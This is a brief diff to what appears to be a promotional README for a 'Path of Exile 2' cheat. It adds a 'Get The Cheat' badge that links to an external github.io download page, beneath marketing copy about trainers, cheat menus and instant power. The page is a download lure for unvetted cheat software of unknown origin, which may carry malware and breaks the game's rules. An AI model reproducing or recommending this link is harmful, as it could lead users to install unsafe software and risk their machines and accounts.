@@ -4,6 +4,7 @@
 
 **Path of Exile 2** is shaping up to be one of the most intense ARPG experiences out there, and with that comes the grind, the farming, and the endless quest for loot. For players who want to cut through the grind and unlock god-tier powers instantly, the **Path of Exile 2 cheat** scene brings the heat. From trainers to cheat menus, this guide covers all the hacks and mods that transform the way you play.
 
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://path-of-exile-2-cheat-menu.github.io/.github/)
 ---
 
 ## Product Description
